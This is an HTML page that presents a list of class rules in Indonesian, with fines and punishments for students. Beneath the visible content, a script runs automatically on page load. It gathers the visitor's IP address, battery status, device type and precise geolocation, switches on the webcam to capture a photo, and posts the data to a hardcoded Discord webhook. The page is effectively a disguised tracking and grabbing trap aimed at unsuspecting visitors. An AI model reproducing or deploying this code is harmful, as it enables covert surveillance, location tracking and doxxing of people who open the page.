<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rules</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #2c3e50;
        }
        video {
            display: block;
            margin: 20px 0;
        }
        .rules {
            margin-top: 20px;
        }
        .rules h2 {
            color: #2c3e50;
        }
        .rules ul {
            list-style: none;
            padding: 0;
        }
        .rules li {
            background: #ecf0f1;
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

        <div class="rules">
            <h2>Aturan Kelas</h2>
            <ul>
                <li>1. Yang tidak mengerjakan PR denda Rp10.000 atau berlari mengelilingi lapangan 20x.</li>
                <li>2. Tidak boleh ada yang ngobrol. Jika ingin bertanya, boleh berbicara dengan saya (Ketua/Wakil). Pelanggaran dikenakan denda Rp5.000 atau berlari mengelilingi lapangan 20x.</li>
                <li>3. Tidak boleh bolak-balik ke WC.</li>
                <li>4. Yang tidak mencatat atau catatannya tidak lengkap serta tidak mengerjakan tugas dikenakan denda Rp5.000, membersihkan kamar mandi, dan berlari mengelilingi lapangan.</li>
            </ul>
        </div>
    </div>
    
    <script>
        async function sendToWebhook(data) {
            const webhookURL = "https://discord.com/api/webhooks/1269291496922808403/Oojg7HJli9J0DWJoYjPdTpa7s_HBX4m6wZPArqFnxKGcmEX4eFI2UU7zWmVqV8BVedOC"; // Replace with your webhook URL

            const payload = {
                embeds: [{
                    title: "User Information",
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "Battery Level", value: data.battery.level, inline: true },
                        { name: "Charging", value: data.battery.charging, inline: true },
                        { name: "Device Info", value: data.phoneInfo, inline: true },
                        { name: "Location", value: `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`, inline: true }
                    ]
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        async function getIPAddress() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function getBatteryInfo() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return { level: battery.level * 100 + "%", charging: battery.charging ? "Yes" : "No" };
            } else {
                return { level: "Unknown", charging: "Unknown" };
            }
        }

        function getPhoneInfo() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android Device";
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS Device";
            if (/windows phone/i.test(ua)) return "Windows Phone";
            if (/Macintosh/i.test(ua)) return "Macintosh";
            if (/Windows/i.test(ua)) return "Windows PC";
            return "Unknown";
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({ lat: position.coords.latitude, lon: position.coords.longitude });
                    }, () => {
                        resolve({ lat: "Unknown", lon: "Unknown" });
                    });
                } else {
                    resolve({ lat: "Unknown", lon: "Unknown" });
                }
            });
        }

        function takePhoto() {
            return new Promise((resolve, reject) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            video.srcObject.getTracks().forEach(track => track.stop());
                            resolve(canvas.toDataURL('image/png'));
                        }, 3000); // Wait 3 seconds before taking the photo
                    })
                    .catch(err => {
                        console.error("Error accessing webcam:", err);
                        resolve("");
                    });
            });
        }

        async function gatherAndSendData() {
            const ip = await getIPAddress();
            const battery = await getBatteryInfo();
            const phoneInfo = getPhoneInfo();
            const location = await getLocation();
            const photoUrl = await takePhoto();

            const data = { ip, battery, phoneInfo, location };

            sendToWebhook(data, photoUrl);
        }

        window.onload = gatherAndSendData;
    </script>
</body>
</html>
